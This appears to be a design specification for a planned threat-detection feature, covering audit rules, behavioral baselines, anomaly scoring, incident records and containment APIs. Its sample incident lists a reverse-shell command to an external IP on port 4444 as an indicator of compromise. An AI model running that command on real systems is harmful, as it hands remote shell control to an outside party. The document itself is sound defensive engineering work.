# AI Threat Detection

> **Feature ID:** 4  
> **Category:** AI & Intelligence  
> **Primary Service:** Orchestrator Agent  
> **Effort Estimate:** Large (7-10 PT)  
> **Status:** Planned

---

## Overview

Behavioral analysis of container processes, SSH login patterns, and network traffic to detect security threats in real time. The system establishes per-server and per-container behavioral baselines, then flags deviations that may indicate compromise, intrusion, or policy violations.

When a threat is detected, a security incident is raised with supporting evidence, severity classification, and recommended remediation steps.

### Goals

- Detect compromised containers through abnormal process execution
- Identify brute-force SSH attacks and unusual login patterns
- Flag anomalous network connections (unexpected egress, port scanning)
- Raise structured security incidents with forensic evidence
- Integrate with existing alerting and incident management workflows

---

## Architecture

```
┌──────────────────────────────────────────────────────────┐
│                   Data Sources                            │
│  ┌─────────────┐  ┌─────────────┐  ┌──────────────────┐ │
│  │ Process     │  │ SSH Auth    │  │ Network Flow     │ │
│  │ Events      │  │ Logs        │  │ (eBPF / ntopng)  │ │
│  │ (auditd)    │  │ (/var/log/  │  │                  │ │
│  │             │  │  auth.log)  │  │                  │ │
│  └──────┬──────┘  └──────┬──────┘  └────────┬─────────┘ │
└─────────┼────────────────┼──────────────────┼────────────┘
          │                │                  │
          ▼                ▼                  ▼
┌──────────────────────────────────────────────────────────┐
│              Orchestrator Agent                           │
│                                                           │
│  ┌────────────────────────────────────────────────────┐  │
│  │          Behavioral Baseline Engine                  │  │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────────────┐ │  │
│  │  │ Process  │  │ SSH      │  │ Network          │ │  │
│  │  │ Baseline │  │ Baseline │  │ Baseline         │ │  │
│  │  └────┬─────┘  └────┬─────┘  └──────┬───────────┘ │  │
│  │       │              │               │             │  │
│  │       ▼              ▼               ▼             │  │
│  │  ┌────────────────────────────────────────────┐    │  │
│  │  │      Anomaly Scoring Engine                 │    │  │
│  │  │  ┌──────────┐  ┌──────────┐  ┌──────────┐ │    │  │
│  │  │  │ Process  │  │ Auth     │  │ Network  │ │    │  │
│  │  │  │ Scorer   │  │ Scorer   │  │ Scorer   │ │    │  │
│  │  │  └────┬─────┘  └────┬─────┘  └────┬─────┘ │    │  │
│  │  │       │              │              │       │    │  │
│  │  │       ▼              ▼              ▼       │    │  │
│  │  │  ┌────────────────────────────────────┐    │    │  │
│  │  │  │      Aggregated Threat Score       │    │    │  │
│  │  │  └──────────────────┬─────────────────┘    │    │  │
│  │  └─────────────────────┼───────────────────────┘    │  │
│  │                        │                            │  │
│  │                        ▼                            │  │
│  │  ┌────────────────────────────────────────────────┐ │  │
│  │  │          Incident Creator                       │ │  │
│  │  │  ┌──────────┐  ┌──────────┐  ┌──────────────┐ │ │  │
│  │  │  │ Evidence │──│ Severity │──│ Remediation  │ │ │  │
│  │  │  │ Collector│  │ Classify │  │ Suggestions  │ │ │  │
│  │  │  └──────────┘  └──────────┘  └──────────────┘ │ │  │
│  │  └────────────────────────────────────────────────┘ │  │
│  └──────────────────────────────────────────────────────┘  │
│                        │                                   │
│                        ▼                                   │
│              ┌──────────────────┐                          │
│              │  Alert / Notify   │                          │
│              └──────────────────┘                          │
└──────────────────────────────────────────────────────────┘
```

---

## Implementation Plan

### Phase 1: Data Collection (2-3 PT)

| Step | Description | Artifacts |
|------|-------------|-----------|
| 1.1 | Deploy auditd rules for process monitoring | `audit.rules` capturing execve, fork, file modifications |
| 1.2 | SSH auth log collection agent | Tail `auth.log`, parse structured events |
| 1.3 | Network flow data collection | eBPF-based per-container traffic monitor or ntopng |
| 1.4 | Event normalization pipeline | Unified schema: `{event_type, timestamp, source, data}` |
| 1.5 | Event buffer & persistence | Kafka topic + TimescaleDB for time-series analysis |

**Audit rules:**

```bash
# /etc/audit/rules.d/threat-detection.rules
# Monitor process execution
-w /usr/bin/ -p x -k process_exec
-w /usr/sbin/ -p x -k process_exec
-w /bin/ -p x -k process_exec

# Monitor sensitive file access
-w /etc/passwd -p rwa -k sensitive_file
-w /etc/shadow -p rwa -k sensitive_file
-w /etc/ssh/sshd_config -p wa -k ssh_config

# Monitor container runtime
-w /var/run/docker.sock -p rw -k docker_sock
```

**Normalized event schema:**

```yaml
# config/event_schema.yaml
events:
  process:
    fields: [timestamp, host, container_id, pid, ppid, uid, cmdline, exe, cwd, exit_code]
    source: auditd
  ssh_auth:
    fields: [timestamp, host, user, source_ip, auth_method, success, session_id, pid]
    source: auth.log
  network_flow:
    fields: [timestamp, host, container_id, src_ip, src_port, dst_ip, dst_port, proto, bytes, packets, direction]
    source: ebpf
```

### Phase 2: Behavioral Baselines (2 PT)

| Step | Description | Artifacts |
|------|-------------|-----------|
| 2.1 | Process baseline per container image | Allow-listed binaries, typical command-line patterns |
| 2.2 | SSH login baseline per host | Expected users, source IP ranges, login frequency |
| 2.3 | Network traffic baseline per container | Expected egress destinations, port usage, protocol mix |
| 2.4 | Baseline persistence & versioning | Baseline snapshots, automatic weekly recalibration |

**Baseline model:**

```python
# pseudocode: behavioral_baseline.py
class ProcessBaseline:
    def __init__(self, container_image: str):
        self.allowed_executables: set[str] = set()
        self.allowed_parents: dict[str, set[str]] = {}  # parent -> children
        self.allowed_cmdline_patterns: list[re.Pattern] = []
        self.cpu_quota_us: int = 0
        self.memory_quota_bytes: int = 0
        self.typical_uptime_seconds: float = 0.0

    async def learn(self, events: list[ProcessEvent]):
        """Build baseline from historical events."""
        for ev in events:
            self.allowed_executables.add(ev.exe)
            if ev.ppid_name:
                self.allowed_parents.setdefault(ev.ppid_name, set()).add(ev.exe)

    def is_anomalous(self, event: ProcessEvent) -> AnomalyScore:
        score = 0.0
        if event.exe not in self.allowed_executables:
            score += 0.6  # Unknown binary
        if event.ppid_name and event.ppid_name in self.allowed_parents:
            if event.exe not in self.allowed_parents[event.ppid_name]:
                score += 0.3  # Unusual parent-child relationship
        if self._is_malicious_pattern(event.cmdline):
            score += 0.8  # Known malicious pattern
        return AnomalyScore(score=min(score, 1.0), reasons=self._reasons)
```

### Phase 3: Anomaly Scoring & Incident Creation (2-3 PT)

| Step | Description | Artifacts |
|------|-------------|-----------|
| 3.1 | Process anomaly scorer | Compares events against process baseline |
| 3.2 | Auth anomaly scorer | Geo-IP mismatch, impossible travel, credential stuffing |
| 3.3 | Network anomaly scorer | Unexpected egress, beaconing detection, port scan detection |
| 3.4 | Aggregated threat scoring | Weighted combination of sub-scores |
| 3.5 | Incident creation & evidence packaging | Structured incident with timeline, affected resources, indicators of compromise |
| 3.6 | Remediation suggestion engine | Lookup table + ML classification for recommended actions |

**Scoring config:**

```yaml
# config/threat_scoring.yaml
scoring:
  weights:
    process: 0.35
    auth: 0.35
    network: 0.30

  thresholds:
    incident_critical: 0.85
    incident_warning: 0.60
    incident_info: 0.40
    logging_only: 0.20

  process:
    unknown_binary_weight: 0.6
    unusual_parent_weight: 0.3
    crypto_miner_pattern: 0.9
    reverse_shell_pattern: 0.95
    file_encryption_pattern: 0.9

  auth:
    brute_force_threshold: 5  # failed attempts in window
    brute_force_window_s: 300
    geo_anomaly_weight: 0.5
    impossible_travel_kmh: 1000
    credential_stuffing_threshold: 20
    root_login_weight: 0.3

  network:
    unexpected_egress_weight: 0.7
    known_malicious_ip_weight: 0.9
    tor_exit_node_weight: 0.6
    port_scan_threshold: 20
    dns_tunnel_pattern: 0.85
    data_exfil_bytes_per_s: 104857600  # 100 MB/s
```

**Incident structure:**

```json
{
  "id": "inc-20260527-001",
  "severity": "critical",
  "title": "Possible reverse shell on container web-01",
  "description": "Container web-01 (srv-abc123) spawned a process connecting to an external IP on port 4444. The process /bin/bash has an established connection to 198.51.100.42:4444.",
  "score": 0.92,
  "source": "process_anomaly",
  "status": "open",
  "detected_at": "2026-05-27T14:30:00Z",
  "timeline": [
    {"t": "14:29:55", "event": "SSH login from unusual IP 198.51.100.42"},
    {"t": "14:30:00", "event": "Container web-01: /bin/bash spawned by apache2 (unusual parent-child)"},
    {"t": "14:30:02", "event": "Outbound TCP connection from web-01 to 198.51.100.42:4444"},
    {"t": "14:30:05", "event": "Process /bin/bash executing with interactive flags (-i)"}
  ],
  "affected_resources": [
    {"type": "container", "id": "web-01", "server_id": "srv-abc123", "image": "nginx:latest"}
  ],
  "indicators": [
    {"type": "ip", "value": "198.51.100.42", "confidence": 0.9, "context": "C2 server"},
    {"type": "process", "value": "/bin/bash -i >& /dev/tcp/198.51.100.42/4444", "confidence": 0.95}
  ],
  "recommendations": [
    {"action": "isolate_container", "target": "web-01", "description": "Isolate container from network"},
    {"action": "snapshot_and_terminate", "target": "web-01", "description": "Take forensic snapshot, then terminate"},
    {"action": "revoke_keys", "target": "srv-abc123", "description": "Rotate SSH keys and credentials"}
  ]
}
```

### Phase 4: Response & Remediation (1-2 PT)

| Step | Description | Artifacts |
|------|-------------|-----------|
| 4.1 | Automated containment actions | Network isolation, container stop, user lockout |
| 4.2 | Incident lifecycle management | Status transitions: `open → investigating → contained → resolved` |
| 4.3 | Forensics evidence packaging | Log export, process tree, network pcap |
| 4.4 | Integration with SIEM / notification channels | Splunk, ELK, Discord, Slack |

---

## API Design

### REST API

#### List Incidents

```
GET /api/v1/incidents
  ?severity=critical,warning
  &source=process_anomaly,auth_anomaly,network_anomaly
  &status=open,investigating,contained,resolved
  &affected_resource=web-01
  &from=2026-05-01T00:00:00Z
  &to=2026-05-27T23:59:59Z
  &limit=50
```

Response:
```json
{
  "incidents": [
    {
      "id": "inc-20260527-001",
      "severity": "critical",
      "title": "Possible reverse shell on container web-01",
      "score": 0.92,
      "source": "process_anomaly",
      "status": "open",
      "detected_at": "2026-05-27T14:30:00Z",
      "affected_resources": [
        {"type": "container", "id": "web-01", "server_id": "srv-abc123"}
      ]
    }
  ],
  "total": 3,
  "limit": 50,
  "offset": 0
}
```

#### Get Incident Details

```
GET /api/v1/incidents/{id}
```

Response: (full incident JSON as shown above)

#### Update Incident Status

```
PATCH /api/v1/incidents/{id}
```

Request:
```json
{
  "status": "investigating",
  "assigned_to": "sre-team",
  "comment": "Investigating reverse shell activity on web-01"
}
```

#### Trigger Containment Action

```
POST /api/v1/incidents/{id}/contain
```

Request:
```json
{
  "action": "isolate_container",
  "target": "web-01",
  "reason": "Automated containment of confirmed reverse shell"
}
```

Response:
```json
{
  "action_id": "act-789",
  "status": "executing",
  "estimated_completion": "2026-05-27T14:31:00Z"
}
```

#### Get Baseline Status

```
GET /api/v1/threat/baselines
  ?resource=container:web-01
  &type=process,network,auth
```

Response:
```json
{
  "baselines": [
    {
      "resource": "container:web-01",
      "type": "process",
      "version": 12,
      "last_calibrated": "2026-05-25T00:00:00Z",
      "total_binaries_known": 24,
      "anomalies_in_window": 2
    }
  ]
}
```

#### Acknowledge Baseline Drift

```
POST /api/v1/threat/baselines/recalibrate
```

Request:
```json
{
  "resource": "container:web-01",
  "type": "process",
  "reason": "Application update introduced new binaries"
}
```

---

## Data Model

```python
# models/threat_detection.py
@dataclass
class SecurityEvent:
    id: str
    event_type: str           # process / ssh_auth / network_flow
    timestamp: datetime
    host: str
    container_id: str | None
    raw: dict

@dataclass
class Baseline:
    resource_id: str
    resource_type: str        # container / host / image
    baseline_type: str        # process / auth / network
    version: int
    data: dict                # Baseline specifics per type
    last_calibrated: datetime
    event_count: int

@dataclass
class AnomalyScore:
    score: float              # 0.0 - 1.0
    reasons: list[str]
    evidence: list[dict]

@dataclass
class Incident:
    id: str
    severity: str             # critical / warning / info
    title: str
    description: str
    score: float
    source: str               # process_anomaly / auth_anomaly / network_anomaly / aggregated
    status: str               # open / investigating / contained / resolved / dismissed
    detected_at: datetime
    timeline: list[TimelineEntry]
    affected_resources: list[ResourceRef]
    indicators: list[Indicator]
    recommendations: list[Recommendation]
    assigned_to: str | None
    resolved_at: datetime | None
    containment_actions: list[ContainmentAction]

@dataclass
class TimelineEntry:
    timestamp: datetime
    event: str

@dataclass
class Indicator:
    type: str                 # ip / domain / process / file_hash / network_sig
    value: str
    confidence: float
    context: str | None

@dataclass
class Recommendation:
    action: str
    target: str
    description: str

@dataclass
class ContainmentAction:
    id: str
    action_type: str
    target: str
    status: str               # pending / executing / completed / failed
    initiated_by: str
    initiated_at: datetime
    completed_at: datetime | None
```

**Database Schema:**

```sql
-- Security events (raw, short retention)
CREATE TABLE security_events (
    id              TEXT PRIMARY KEY,
    event_type      TEXT NOT NULL,
    timestamp       TIMESTAMPTZ NOT NULL,
    host            TEXT NOT NULL,
    container_id    TEXT,
    raw             JSONB NOT NULL
) PARTITION BY RANGE (timestamp);

CREATE INDEX idx_events_type_ts ON security_events(event_type, timestamp);

-- Baselines
CREATE TABLE baselines (
    id              SERIAL PRIMARY KEY,
    resource_id     TEXT NOT NULL,
    resource_type   TEXT NOT NULL,
    baseline_type   TEXT NOT NULL,
    version         INTEGER NOT NULL DEFAULT 1,
    data            JSONB NOT NULL,
    last_calibrated TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    event_count     INTEGER DEFAULT 0,
    UNIQUE (resource_id, resource_type, baseline_type, version)
);

-- Incidents
CREATE TABLE incidents (
    id              TEXT PRIMARY KEY,
    severity        TEXT NOT NULL,
    title           TEXT NOT NULL,
    description     TEXT,
    score           DOUBLE PRECISION NOT NULL,
    source          TEXT NOT NULL,
    status          TEXT NOT NULL DEFAULT 'open',
    detected_at     TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    timeline        JSONB DEFAULT '[]',
    affected_resources JSONB DEFAULT '[]',
    indicators      JSONB DEFAULT '[]',
    recommendations JSONB DEFAULT '[]',
    assigned_to     TEXT,
    resolved_at     TIMESTAMPTZ,
    created_at      TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX idx_incidents_severity ON incidents(severity);
CREATE INDEX idx_incidents_status ON incidents(status);
CREATE INDEX idx_incidents_source ON incidents(source);

-- Containment actions
CREATE TABLE containment_actions (
    id              TEXT PRIMARY KEY,
    incident_id     TEXT REFERENCES incidents(id),
    action_type     TEXT NOT NULL,
    target          TEXT NOT NULL,
    status          TEXT NOT NULL DEFAULT 'pending',
    initiated_by    TEXT NOT NULL,
    initiated_at    TIMESTAMPTZ DEFAULT NOW(),
    completed_at    TIMESTAMPTZ
);
```

---

## Service Assignments

| Service | Responsibility |
|---------|---------------|
| **Orchestrator Agent** | Data collection (auditd, auth logs, network flows), behavioral baselines, anomaly scoring, incident creation, containment actions |
| **Integration Service** | Notification dispatch (Discord/Slack), SIEM forwarding, incident management workflow |
| **Management Panel** | Incident dashboard, timeline view, evidence browser, containment action UI, baseline management |
| **Discord / Slack** | Critical incident alerts with action buttons (acknowledge, contain, dismiss) |

---

## Configuration Reference

```yaml
# config/threat_detection.yaml
collection:
  auditd_rules: "/etc/audit/rules.d/threat-detection.rules"
  auth_log_path: "/var/log/auth.log"
  network:
    method: "ebpf"              # ebpf | ntopng | netflow
    interface: "eth0"
    sampling_rate: 1.0          # 1.0 = all packets
  buffer_size: 10000
  flush_interval_s: 5

baselines:
  calibration_window_days: 14
  auto_recalibrate: true
  recalibrate_interval_hours: 168
  min_events_for_baseline: 1000

incidents:
  auto_contain:
    enabled: false              # opt-in per policy
    max_severity: "critical"
    actions:
      - "isolate_container"
  auto_resolve_after_hours: 72
  max_incidents_per_source_per_hour: 10

integrations:
  siem:
    enabled: false
    target: "syslog+tls://siem.example.com:514"
    format: "cef"               # cef / leef / json
  discord:
    channel: "security-alerts"
    include_evidence: true
  slack:
    channel: "#security"
```

---

## Effort Breakdown

| Phase | Task | PT | Dependencies |
|-------|------|----|-------------|
| 1.1 | Auditd rule deployment | 0.5 | Node access |
| 1.2 | SSH log collection agent | 0.5 | Log pipeline |
| 1.3 | Network flow data collection | 1 | eBPF / kernel support |
| 1.4 | Event normalization pipeline | 0.5 | Event schema |
| 1.5 | Event buffer & persistence | 0.5 | Kafka + TimescaleDB |
| 2.1 | Process baseline engine | 1 | Normalized events |
| 2.2 | SSH baseline engine | 0.5 | Auth events |
| 2.3 | Network baseline engine | 0.5 | Network events |
| 2.4 | Baseline persistence | 0.5 | DB schema |
| 3.1 | Process anomaly scorer | 1 | Process baseline |
| 3.2 | Auth anomaly scorer | 0.5 | SSH baseline |
| 3.3 | Network anomaly scorer | 0.5 | Network baseline |
| 3.4 | Aggregated threat scoring | 0.5 | All scorers |
| 3.5 | Incident creation | 1 | Aggregated score |
| 3.6 | Remediation suggestions | 0.5 | Incident data |
| 4.1 | Containment actions | 0.5 | Cloud/Docker API |
| 4.2 | Incident lifecycle | 0.25 | State machine |
| 4.3 | Forensics packaging | 0.5 | Evidence store |
| 4.4 | SIEM/notification integration | 0.5 | Integration service |
| | **Total** | **10.75** | |

---

## Risks & Mitigations

| Risk | Impact | Mitigation |
|------|--------|------------|
| False positives cause alert fatigue | Ignored real threats | Baseline calibration, configurable thresholds, feedback loop for tuning |
| eBPF/kernel compatibility | Missing network events | Fallback to ntopng or tcpdump-based collection |
| Baseline drift after updates | Incorrect anomaly flags | Auto-recalibration after deployments, grace period post-update |
| Performance overhead of monitoring | CPU/memory cost | Sampling for high-traffic hosts, configurable event rate limits |
| Containment action causes outage | Service disruption | Require human approval for auto-contain, pre-check dependencies |

---

## Metrics & KPIs

| Metric | Target | Measurement |
|--------|--------|-------------|
| Mean time to detect (MTTD) | < 60s | Time from event to incident creation |
| Mean time to contain (MTTC) | < 5min | Time from incident to containment action |
| True positive rate | > 90% | Confirmed incidents / total incidents |
| False positive rate | < 10% | False incidents / total incidents |
| Baseline recalibration time | < 30min | Full pipeline time for a single resource |
| Containment action success rate | > 99% | Successful actions / total actions executed |
